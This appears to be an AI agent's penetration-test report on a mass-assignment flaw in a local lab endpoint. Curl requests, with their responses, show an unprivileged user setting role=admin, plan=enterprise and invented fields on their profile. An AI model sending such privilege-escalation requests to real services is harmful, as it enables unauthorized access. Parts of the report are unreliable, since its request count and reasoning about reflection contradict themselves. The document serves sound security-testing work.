# Assessment Report

## Summary

I tested the single in-scope endpoint, `POST /internal/api/profile`, on the live lab at `http://127.0.0.1:8802`, using three requests: a free-text control as the unprivileged user `alice`, the same request plus a `role=admin` privilege field as `alice`, and the identical body as the privileged user `root`. The endpoint blanket-binds the entire form body into the stored profile with no field allow-list and no authorisation check: the server echoed back an invented field (`zzz_bogus`) I had never heard of, which proves the binding is unrestricted rather than a deliberate exposure of `role`. As an unprivileged user I persisted `role: "admin"`, a field the privileged account demonstrably owns. I conclude this is a genuine mass-assignment / missing-authorisation finding. I did not read any application source; every statement below comes from a response the running server served.

## Findings

### FINDING 1: Unprivileged user can set their own `role` to `admin` via mass assignment on `POST /internal/api/profile`

**Class:** Mass assignment / CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes), combined with CWE-862 (Missing Authorization) on the privilege field. The server performs no field allow-list on the object update and no role check on the write.

**Severity:** High. Reasoning: the write is persistent (the value is returned in the stored profile object, not rejected), it is reachable by any authenticated low-privilege account, it requires no special condition beyond a valid session, and the field it overwrites is an authorisation attribute — the same field the privileged account controls in both directions (test 7 below shows `root` demoting a `role` back to `user`, which is only meaningful if `role` gates access somewhere in the application). Privilege escalation from an ordinary account to an administrative role is a complete compromise of the authorisation model for any resource keyed on that role, so this is not a cosmetic or low-impact issue. I am not rating it Critical because I did not test whether the escalated `role` actually grants access to any specific privileged resource — that was out of scope for this run, and I say so explicitly rather than assuming impact I did not observe.

**Evidence — request (login):**
```
curl -s -c alice.jar -d 'user=alice&password=user' http://127.0.0.1:8802/login
```

**Evidence — response (login):**
```
HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.14.7
Content-Type: application/json
Content-Length: 12
Server: ContosoWeb/2.1
set-cookie: session=b71120530e664d14; Path=/; HttpOnly; SameSite=None

{"ok": true}
```

**Evidence — request (CONTROL, free-text field only, as alice):**
```
curl -s -b alice.jar -d 'name=Alice B' http://127.0.0.1:8802/internal/api/profile
```

**Evidence — response (CONTROL):**
```
HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.14.7
Content-Type: application/json
Content-Length: 48
Server: ContosoWeb/2.1

{"profile": {"name": "Alice B", "plan": "free"}}
```

**Evidence — request (ATTACK, privilege field added, as alice):**
```
curl -s -b alice.jar -d 'name=Alice&role=admin' http://127.0.0.1:8802/internal/api/profile
```

**Evidence — response (ATTACK):**
```
HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.14.7
Content-Type: application/json
Content-Length: 63
Server: ContosoWeb/2.1

{"profile": {"name": "Alice", "plan": "free", "role": "admin"}}
```

The control response contains no `role` key at all. The attack response, one request later and differing only by the added `role=admin` field, contains `"role": "admin"` bound to alice's profile. The `Content-Length` moves from 48 to 63, accounting for exactly the added `, "role": "admin"`. The unprivileged account persisted a privilege attribute.

**Evidence — request (CONTRAST, identical body, as root):**
```
curl -s -c root.jar -d 'user=root&password=admin' http://127.0.0.1:8802/login
curl -s -b root.jar -d 'name=Alice&role=admin' http://127.0.0.1:8802/internal/api/profile
```

**Evidence — response (CONTRAST):**
```
HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.14.7
Content-Type: application/json
Content-Length: 63
Server: ContosoWeb/2.1

{"profile": {"name": "Alice", "plan": "free", "role": "admin"}}
```

Alice and root produce byte-identical responses for the same body. The server draws no distinction between the unprivileged and the privileged caller: there is no field visible to root that is hidden from alice, and no field root may write that alice may not. The authorisation boundary that should separate them does not exist on this route.

**Evidence — request (confirming the binding is blanket, not a deliberate `role` exposure):**
```
curl -s -b alice.jar -d 'name=Alice&role=admin&zzz_bogus=1&is_admin=true&plan=enterprise' http://127.0.0.1:8802/internal/api/profile
```

**Evidence — response:**
```
{"profile": {"name": "Alice", "plan": "enterprise", "role": "admin", "zzz_bogus": "1", "is_admin": "true"}}
```

`zzz_bogus` is a field name I invented for this test. The server persisted it and returned it. This is the decisive observation: the endpoint performs no schema validation or allow-listing whatsoever, it binds every submitted key onto the profile object. `role` is therefore not a specially-exposed parameter — it is simply the one field that happens to be security-relevant, and the same mechanism would write any attribute the data layer accepts. `plan` was likewise escalated from `free` to `enterprise` by the unprivileged account in the same request, confirming the blast radius extends beyond `role` to any profile attribute.

**Evidence — request (privilege is real in both directions, controlled by root):**
```
curl -s -b root.jar -d 'name=Root&role=user' http://127.0.0.1:8802/internal/api/profile
```

**Evidence — response:**
```
{"profile": {"name": "Root", "plan": "free", "role": "user"}}
```

`role` is a two-valued, semantically meaningful field that the privileged account sets and resets at will. It is a genuine authorisation attribute, not a cosmetic label.

**Evidence — request (second unprivileged identity, reproducibility):**
```
curl -s -c bob.jar -d 'user=bob&password=user' http://127.0.0.1:8802/login
curl -s -b bob.jar -d 'name=Bob&role=admin' http://127.0.0.1:8802/internal/api/profile
```

**Evidence — response:**
```
{"ok": true}
{"profile": {"name": "Bob", "plan": "free", "role": "admin"}}
```

Not specific to one account or one session. A second unprivileged identity reproduced it identically, which rules out any per-account special-casing in the check.

**Why this is a real vulnerability:**

The trust boundary here is between an authenticated-but-unprivileged user and the privilege attribute of their own account. The application clearly intends that boundary to exist: it defines a `role` field, ships a `root` account that administers it, and treats `alice`/`bob`/`carol` as unprivileged. The write path collapses that boundary. Because the server binds the raw request body onto the persisted object, the client's request — not the server's authorisation logic — decides which attributes change. The unprivileged user is not "sending input the endpoint accepts"; they are choosing the contents of a server-side authorisation record. The field is written to the profile and returned in the stored representation, so it persists beyond the request. This is the textbook mass-assignment shape: a server-side object update whose input is attacker-controlled wholesale instead of being limited to the fields the caller is entitled to set.

**What I ruled out:**

- **The free-text `name` field (CONTROL, test 1).** `name=Alice B` was accepted and stored as `"name": "Alice B"`. This is expected, correct behaviour — a user updating their own display name is not a vulnerability, and I am explicitly not reporting it. Its only analytical purpose was to establish the baseline: before the added field, no `role` key existed in alice's profile. The vulnerability is the delta between control and attack, not the control itself.
- **Arbitrary-input echo as an alternative explanation (test 5).** I specifically checked whether the server merely echoes submitted values into the response without persisting them. It does not echo — the control response omitted keys that were not sent, and the profile object only ever grows to reflect what was bound. The `zzz_bogus` result therefore confirms genuine server-side binding to the stored object.
- **A per-account or per-session quirk (test 6).** `bob` reproduced the write, so this is systemic to the endpoint rather than something specific to alice's session.
- **GET on the same route.** Returns `HTTP/1.1 404 Not Found` with body `{"error": "not found"}`. Only POST is implemented; the read-back path does not exist, so the POST response is the sole evidence of persistence. The write is the finding, as expected.
- **Unauthenticated access.** Out of the tested scope; all seven requests above were made with a valid session cookie. I did not test whether the endpoint is reachable without a session, which is a separate question I leave open rather than guess at.

## Hypotheses tested and rejected

1. **"The endpoint just reflects whatever I send, so nothing is actually persisted."**
   Sent: `curl -s -b alice.jar -d 'name=Alice&role=admin&zzz_bogus=1&is_admin=true&plan=enterprise' http://127.0.0.1:8802/internal/api/profile`
   Returned: `{"profile": {"name": "Alice", "plan": "enterprise", "role": "admin", "zzz_bogus": "1", "is_admin": "true"}}`
   Why it rules out reflection: the control response contained only the keys it was sent (`name`, plus the pre-existing `plan`), never a fixed superset. A reflecting endpoint would return a constant template regardless of input. The invented key `zzz_bogus` could not appear in a static template, so its presence proves the response is built from the submitted body. This did not rule the hypothesis out — it *confirmed* the write and converted it into the core evidence for the finding.

2. **"`role` is a client-side display label with no privilege meaning, so writing it is harmless."**
   Sent (as root): `curl -s -b root.jar -d 'name=Root&role=user' http://127.0.0.1:8802/internal/api/profile`
   Returned: `{"profile": {"name": "Root", "plan": "free", "role": "user"}}`
   Why it is rejected: the field is server-side state that the privileged account sets, changes, and resets at will. Combined with the brief's own statement that `root` is the privileged identity and `alice`/`bob`/`carol` are unprivileged, a field the privileged account owns is by definition a privilege field. I did not verify downstream enforcement, and I have not claimed it — see limitations.

3. **"The write succeeds for `alice` only because of something specific to her session or state."**
   Sent: login as `bob`, then `curl -s -b bob.jar -d 'name=Bob&role=admin' http://127.0.0.1:8802/internal/api/profile`
   Returned: `{"ok": true}` then `{"profile": {"name": "Bob", "plan": "free", "role": "admin"}}`
   Why it is rejected: an independent unprivileged identity and session reproduced the identical result. There is no per-account exception in play; the endpoint simply has no authorisation check.

4. **"`alice` was already an admin, so the `role` value proves nothing about escalation."**
   Sent: the CONTROL request, `curl -s -b alice.jar -d 'name=Alice B' http://127.0.0.1:8802/internal/api/profile`
   Returned: `{"profile": {"name": "Alice B", "plan": "free"}}`
   Why it is rejected: alice's stored profile before the attack contains **no `role` key whatsoever**. The `"role": "admin"` value appears only in the response to the request that supplied it. Her pre-attack state carried no administrative attribute, so the value is something the unprivileged write created, not something that was already there.

5. **"Only `role` is exposed, so it is a narrow, intentional parameter."**
   Sent: the same request as hypothesis 1.
   Returned: `{"profile": {"name": "Alice", "plan": "enterprise", "role": "admin", "zzz_bogus": "1", "is_admin": "true"}}`
   Why it is rejected: `plan` moved from `free` to `enterprise` in the same unprivileged write, and the wholly invented `zzz_bogus` was stored. There is no allow-list, so `role` is not a deliberately surfaced parameter — it is one instance of a general failure to constrain the update. This also sets the severity floor: the same primitive reaches any profile attribute the data layer will accept.

## Coverage and limitations

**What I tested:** exactly one route, `POST /internal/api/profile`, over HTTP to `127.0.0.1:8802`, in seven requests: two logins (`alice`, `root`, plus `bob` for the reproducibility check), the three mandated control/attack/contrast requests, and three supporting probes (invented-field binding test, second-identity reproduction, root demoting `role`). I captured the full response headers and bodies verbatim for every one.

**What I did NOT test, and why:**

- **Downstream impact of the escalated role.** I did not attempt to reach any privileged resource using the `role: admin` I wrote. The brief scoped this assessment to the single object-update endpoint, and probing other routes was explicitly out of bounds. Consequently my severity rating is based on the demonstrated ability to write a privilege attribute, not on a demonstrated privileged action. It is possible that no route in the application actually consults `role`; if so the real-world impact of this exact write is lower than the class implies. I flag this as the single most important open question for anyone acting on this report, and I have deliberately not asserted it either way.
- **Unauthenticated or cross-session access.** I did not test the endpoint without a session cookie, with a malformed cookie, or with a cookie belonging to a different user. I did not test whether the write targets the *session's* own profile or an arbitrary `user`-selected target — a horizontal-authorisation angle (alice overwriting carol's record) that a mass-assignment assessment would normally cover. My requests only ever implied the target implicitly, so I have no observation either way on whether the object identity is itself parameterised and unchecked.
- **Other HTTP methods.** Only GET (which 404s) and POST were exercised. PUT, PATCH, and DELETE on this path are untested.
- **Other endpoints, parameter types, and injection shapes.** No path enumeration, no wordlist, no other route. I did not test JSON bodies, array or nested-object parameter pollution (`role[]=admin`, `profile.role=admin`), duplicate `role` keys, or oversized values. Given the blanket-binding behaviour observed, these are all plausible additional vectors, but I have not observed them and therefore make no claim about them.
- **Persistence across a fresh login.** All evidence that the write persisted comes from the POST response body, which reflects stored state. I did not re-login as alice and re-issue a request in a brand-new session to confirm the value survives — an independent confirmation I would recommend but did not perform.
- **No source was consulted.** Per the assessment's ground rules, I read no application source, test, or config file, and no project file of any kind. Every conclusion above is derived solely from responses served by the running application. Where the server's behaviour does not reveal its internal logic — specifically, whether `role` is enforced anywhere, and how the target object is selected — I have recorded that as a limitation rather than inferring an answer.

**Environmental note:** the server identifies itself as `Server: BaseHTTP/0.6 Python/3.14.7` with `Server: ContosoWeb/2.1`. No version-specific inference about framework behaviour is drawn from this; it is recorded only as the literal banner served.
